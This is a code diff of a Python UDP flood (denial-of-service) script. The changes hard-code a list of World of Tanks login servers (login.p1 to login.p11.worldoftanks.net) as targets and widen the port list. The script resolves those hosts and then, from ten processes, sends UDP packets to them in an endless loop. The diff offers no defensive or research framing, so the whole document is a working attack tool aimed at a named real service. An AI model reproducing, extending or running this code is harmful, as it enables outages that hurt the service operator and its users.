@@ -6,31 +6,40 @@ import multiprocessing
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-used_random_ports = [80, 443]
-# used_random_ports = [80, 443, 110, 995, 143, 993, 26, 587, 3306, 2082, 2083, 2086, 2087, 2095, 2096, 2077, 2078]
+used_random_ports = [80, 443, 21, 22, 110, 995, 143, 993, 26, 587, 3306, 2082, 2083, 2086, 2087, 2095, 2096, 2077, 2078]
 
-port_value = random.choice(used_random_ports)
+port_value = 443
+#############
+# with open('sites.txt') as f:
+#     sites = f.readlines()
 
-# Open file with hosts
-with open('sites.txt') as f:
-    sites = f.readlines()
+sites = [
+"login.p1.worldoftanks.net",
+"login.p2.worldoftanks.net",
+"login.p3.worldoftanks.net",
+"login.p4.worldoftanks.net",
+"login.p5.worldoftanks.net",
+"login.p6.worldoftanks.net",
+"login.p7.worldoftanks.net",
+"login.p8.worldoftanks.net",
+"login.p9.worldoftanks.net",
+"login.p10.worldoftanks.net",
+"login.p11.worldoftanks.net",
+]
+ips = []
+print("Targeted sites: \n")
 
 
 def dns_resolve():
-    global sent, clean_ip
-    ips = []
-    print("Targeted sites: \n")
-
+    global sent
     for site in sites:
         site = site.replace("http://", "")
         site = site.replace("https://", "")
-        site = site.replace("www.", "")
         site = site.replace(",", "")
         site = site.replace('"', "")
         site = site.replace("'", "")
         site = site.replace("\n", "")
         site = site.replace("\t", "")
-        site = site.strip()
         if site[-1] == "/":
             site = site[:-1]
         print('"' + site + '",')
@@ -42,19 +51,11 @@ def dns_resolve():
     port = 1
     sent = 0
 
-    # remove duplicates
-    clean_ip = []
-    [clean_ip.append(x) for x in ips if x not in clean_ip]
-    print(f"Amount of unique IPs {len(clean_ip)}")
-
-
-dns_resolve()
-
 
 def send_packets():
     while True:
         global sent, port_value
-        for ip in clean_ip:
+        for ip in ips:
             port_value = random.choice(used_random_ports)
             sock.sendto(bytes, (ip, port_value))
             print("Sent {} packets to {} thought port: {} size {}".format(sent, ip, port_value, packet_size))
@@ -65,7 +66,8 @@ def send_packets():
             time.sleep(0.001)
 
 
-# Create multithreading job list
+dns_resolve()
+
 process_list = []
 for i in range(10):
     packet_size = random.randint(10, 20)
